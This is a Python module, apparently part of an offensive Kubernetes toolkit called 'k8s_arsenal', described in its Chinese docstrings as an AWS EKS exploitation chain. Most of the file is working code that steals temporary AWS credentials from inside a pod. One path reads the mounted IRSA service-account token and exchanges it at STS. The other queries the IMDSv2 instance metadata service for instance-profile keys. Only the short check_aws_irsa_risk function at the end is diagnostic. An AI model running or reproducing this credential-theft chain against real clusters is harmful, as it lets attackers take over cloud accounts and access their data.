"""AWS EKS 利用链

AWS IRSA (IAM Roles for Service Accounts) 利用，IMDS 凭证窃取，跨账号访问。
"""

from typing import Any, Optional

from k8s_arsenal.cloud.base import CloudMetadataBase, CloudCredential


class AWSExploit(CloudMetadataBase):
    """AWS EKS 环境利用"""

    IMDS_BASE = "http://169.254.169.254/latest"
    STS_BASE = "https://sts.amazonaws.com"

    def detect(self) -> bool:
        """检测 AWS 环境"""
        # 方法 1: IMDSv2
        token = self._http_put(
            f"{self.IMDS_BASE}/api/token",
            headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
        )
        if token:
            return True

        # 方法 2: DMI
        try:
            with open("/sys/class/dmi/id/product_name", "r") as f:
                if "ec2" in f.read().lower():
                    return True
        except (FileNotFoundError, PermissionError):
            pass

        return False

    def get_credentials(self) -> Optional[CloudCredential]:
        """获取 AWS 临时凭证

        链式利用:
        1. IMDS → EC2 Instance Profile
        2. IRSA → EKS Pod Role → AWS STS
        3. Web Identity Token → STS AssumeRoleWithWebIdentity
        """
        # 路径 1: IRSA (EKS Pod Identity)
        token_file = "/var/run/secrets/eks.amazonaws.com/serviceaccount/token"
        role_arn = None

        try:
            with open(token_file, "r") as f:
                web_identity_token = f.read().strip()
        except (FileNotFoundError, PermissionError):
            web_identity_token = None

        if web_identity_token:
            # 读取 AWS_ROLE_ARN 环境变量
            import os
            role_arn = os.environ.get("AWS_ROLE_ARN")
            if role_arn:
                cred = self._assume_role_with_web_identity(
                    role_arn, web_identity_token
                )
                if cred:
                    return cred

        # 路径 2: IMDSv2 → EC2 Instance Profile
        return self._get_instance_credentials()

    def _get_instance_credentials(self) -> Optional[CloudCredential]:
        """通过 IMDSv2 获取 EC2 Instance Profile 凭证"""
        token = self._http_put(
            f"{self.IMDS_BASE}/api/token",
            headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
        )
        if not token:
            return None

        headers = {"X-aws-ec2-metadata-token": token}

        role_name = self._http_get(
            f"{self.IMDS_BASE}/meta-data/iam/security-credentials/",
            headers=headers,
        )
        if not role_name:
            return None

        role_name = role_name.strip()
        cred_data = self._http_get(
            f"{self.IMDS_BASE}/meta-data/iam/security-credentials/{role_name}",
            headers=headers,
        )
        if not cred_data:
            return None

        try:
            import json
            cred_json = json.loads(cred_data)
            return CloudCredential(
                provider="aws",
                access_key_id=cred_json.get("AccessKeyId"),
                secret_access_key=cred_json.get("SecretAccessKey"),
                session_token=cred_json.get("Token"),
                expires_at=cred_json.get("Expiration"),
            )
        except (json.JSONDecodeError, KeyError):
            pass

        return None

    def _assume_role_with_web_identity(
        self, role_arn: str, token: str
    ) -> Optional[CloudCredential]:
        """IRSA: AssumeRoleWithWebIdentity"""
        import os
        import urllib.parse

        session_name = f"k8s-arsenal-{os.getpid()}"
        params = urllib.parse.urlencode({
            "Action": "AssumeRoleWithWebIdentity",
            "RoleArn": role_arn,
            "RoleSessionName": session_name,
            "WebIdentityToken": token,
            "Version": "2011-06-15",
        })

        resp = self._http_get(f"{self.STS_BASE}?{params}")
        if not resp:
            return None

        try:
            import xml.etree.ElementTree as ET
            root = ET.fromstring(resp)
            ns = {"ns": "https://sts.amazonaws.com/doc/2011-06-15/"}
            cred_elem = root.find(".//ns:Credentials", ns)
            if cred_elem is not None:
                return CloudCredential(
                    provider="aws",
                    access_key_id=cred_elem.findtext("ns:AccessKeyId", "", ns),
                    secret_access_key=cred_elem.findtext("ns:SecretAccessKey", "", ns),
                    session_token=cred_elem.findtext("ns:SessionToken", "", ns),
                    expires_at=cred_elem.findtext("ns:Expiration", "", ns),
                )
        except Exception:
            pass

        return None

    def get_instance_info(self) -> dict:
        """获取 EC2 实例信息"""
        info: dict[str, Any] = {}
        token = self._http_put(
            f"{self.IMDS_BASE}/api/token",
            headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
        )
        if not token:
            return info

        headers = {"X-aws-ec2-metadata-token": token}
        for field in [
            "instance-id", "instance-type", "region",
            "availability-zone", "local-ipv4", "public-ipv4",
        ]:
            val = self._http_get(
                f"{self.IMDS_BASE}/meta-data/{field}", headers=headers
            )
            if val:
                info[field] = val.strip()

        return info


def check_aws_irsa_risk(kubeconfig: Optional[str] = None) -> dict:
    """检查 AWS IRSA 利用风险

    检查 Pod 是否挂载了 IRSA 角色，并评估风险。
    """
    result = {
        "irsa_enabled": False,
        "role_arn": None,
        "web_identity_token_mounted": False,
        "risk_level": "none",
        "description": "",
    }

    import os

    # 检查 IRSA 挂载路径
    token_path = "/var/run/secrets/eks.amazonaws.com/serviceaccount/token"
    if os.path.exists(token_path):
        result["web_identity_token_mounted"] = True
        result["irsa_enabled"] = True

    role_arn = os.environ.get("AWS_ROLE_ARN")
    if role_arn:
        result["role_arn"] = role_arn
        result["irsa_enabled"] = True

    if result["irsa_enabled"]:
        result["risk_level"] = "high"
        result["description"] = "Pod 挂载了 IRSA 角色，可通过 STS 获取 AWS 临时凭证"

    return result
